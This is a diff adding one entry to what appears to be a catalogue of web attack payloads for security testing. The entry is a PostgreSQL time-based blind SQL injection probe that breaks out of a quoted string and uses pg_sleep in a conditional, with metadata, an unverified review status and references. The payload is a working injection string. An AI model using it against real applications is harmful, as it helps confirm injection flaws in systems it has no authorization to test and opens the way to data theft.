@@ -1,0 +1,24 @@
+id: web-sqli-time-blind-postgresql-conditional-3s-001
+schema_version: 1
+technique_id: web-sqli-time-blind
+name: PostgreSQL conditional delay probe
+content: ''' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END) IS NULL-- '
+target_technology: PostgreSQL
+technology_versions: []
+injection_context: quoted-string
+encoding: none
+expected_behavior: Illustrates a conditional short delay. Expression compatibility depends on query context
+  and PostgreSQL version; validate syntax in a local lab before use.
+waf_bypass_for: []
+related_payload: null
+review:
+  status: unverified
+  last_tested: null
+  tested_against: []
+  evidence: []
+references:
+- https://portswigger.net/web-security/sql-injection/cheat-sheet
+- https://cwe.mitre.org/data/definitions/89.html
+source: original
+adapted_from: null
+license: pending-policy-review
